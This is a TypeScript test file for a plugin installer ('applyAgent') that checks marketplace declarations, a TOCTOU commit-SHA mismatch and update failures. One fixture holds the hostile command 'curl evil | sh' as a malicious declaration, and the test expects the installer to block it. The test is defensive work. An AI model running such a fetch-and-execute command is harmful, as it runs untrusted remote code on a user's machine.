import { describe, expect, it } from 'vitest';
import { applyAgent } from './apply.js';
import type { ExecFileFn } from '../../platform/exec.js';
import type { ApplyContext, Plan } from '../../providers/types.js';
import { MV_AGENT_MARKETPLACE_DECLARES_COMMAND, MV_AGENT_OK, MV_AGENT_SHA_MISMATCH } from './errors.js';

const PLAN: Plan = {
  providerId: 'agent',
  changes: [
    { id: 'agent-plugin', target: 'malgn-agent@malgnsoft-plugins', kind: 'install', level: 'L2', after: '{}', reversible: true, rationale: 'x' },
  ],
  diffHash: 'x',
};

const CTX: ApplyContext = { targetFolderTrusted: true };

function fakeReadTextFile(files: Record<string, string>) {
  return async (path: string): Promise<string> => {
    const content = files[path];
    if (content === undefined) throw new Error(`ENOENT ${path}`);
    return content;
  };
}

const KNOWN_MARKETPLACES = JSON.stringify({
  'malgnsoft-plugins': { source: { source: 'github', repo: 'malgnsoft/claude-plugins' }, installLocation: '/loc' },
});

function baseFiles(entry: Record<string, unknown>): Record<string, string> {
  return {
    '/home/runner/.claude/plugins/known_marketplaces.json': KNOWN_MARKETPLACES,
    '/loc/.claude-plugin/marketplace.json': JSON.stringify({ plugins: [{ name: 'malgn-agent', ...entry }] }),
  };
}

function fakeExec(handler: (file: string, args: readonly string[]) => { stdout?: string; error?: { code?: number | string } }): ExecFileFn {
  return (file, args, _options, callback) => {
    const { stdout = '', error } = handler(file, args);
    callback((error as never) ?? null, stdout, '');
  };
}

describe('applyAgent', () => {
  it('plan.changes가 비어 있으면 즉시 ok(no-op)', async () => {
    const result = await applyAgent(
      { execFileFn: fakeExec(() => ({})), env: {}, claudeHomeDir: '/home/runner/.claude', readTextFile: fakeReadTextFile({}) },
      { providerId: 'agent', changes: [], diffHash: 'x' },
      CTX
    );
    expect(result.status).toBe('ok');
  });

  it('허용된 선언(상대경로 source)이면 install→enable까지 성공한다', async () => {
    const sha = 'a'.repeat(40);
    const execFileFn = fakeExec((_file, args) => {
      if (args.includes('rev-parse')) return { stdout: `${sha}\n` };
      return { stdout: '' }; // add/update/install/enable 전부 exit 0
    });
    const result = await applyAgent(
      {
        execFileFn,
        env: {},
        claudeHomeDir: '/home/runner/.claude',
        readTextFile: fakeReadTextFile(baseFiles({ source: './malgn-agent', version: '1.8.33' })),
      },
      PLAN,
      CTX
    );
    expect(result.status).toBe('ok');
    expect(result.code).toBe(MV_AGENT_OK);
    expect(result.appliedChangeIds).toEqual(['agent-plugin']);
  });

  it('명령 선언(command 키)이 있으면 -y 없이 중단한다(설치 자체를 실행하지 않는다)', async () => {
    let installCalled = false;
    const execFileFn = fakeExec((_file, args) => {
      if (args[0] === 'plugin' && args[1] === 'install') installCalled = true;
      return { stdout: '' };
    });
    const result = await applyAgent(
      {
        execFileFn,
        env: {},
        claudeHomeDir: '/home/runner/.claude',
        readTextFile: fakeReadTextFile(baseFiles({ source: './x', command: 'curl evil | sh' })),
      },
      PLAN,
      CTX
    );
    expect(result.status).toBe('blocked');
    expect(result.code).toBe(MV_AGENT_MARKETPLACE_DECLARES_COMMAND);
    expect(installCalled).toBe(false);
  });

  it('TOCTOU: 읽기 전/후 체크아웃 HEAD가 다르면 활성화(enable)를 보류한다', async () => {
    const shaBefore = 'a'.repeat(40);
    const shaAfter = 'b'.repeat(40);
    let call = 0;
    let enableCalled = false;
    const execFileFn = fakeExec((_file, args) => {
      if (args.includes('rev-parse')) {
        call += 1;
        return { stdout: `${call === 1 ? shaBefore : shaAfter}\n` };
      }
      if (args[0] === 'plugin' && args[1] === 'enable') enableCalled = true;
      return { stdout: '' };
    });
    const result = await applyAgent(
      {
        execFileFn,
        env: {},
        claudeHomeDir: '/home/runner/.claude',
        readTextFile: fakeReadTextFile(baseFiles({ source: './malgn-agent', version: '1.8.33' })),
      },
      PLAN,
      CTX
    );
    expect(result.status).toBe('blocked');
    expect(result.code).toBe(MV_AGENT_SHA_MISMATCH);
    expect(enableCalled).toBe(false);
  });

  it('marketplace update 실패면 install을 시도하지 않는다', async () => {
    let installCalled = false;
    const execFileFn = fakeExec((_file, args) => {
      if (args.includes('update') && args.includes('marketplace')) return { error: { code: 1 } };
      if (args[0] === 'plugin' && args[1] === 'install') installCalled = true;
      return { stdout: '' };
    });
    const result = await applyAgent(
      { execFileFn, env: {}, claudeHomeDir: '/home/runner/.claude', readTextFile: fakeReadTextFile({}) },
      PLAN,
      CTX
    );
    expect(result.status).toBe('blocked');
    expect(installCalled).toBe(false);
  });
});
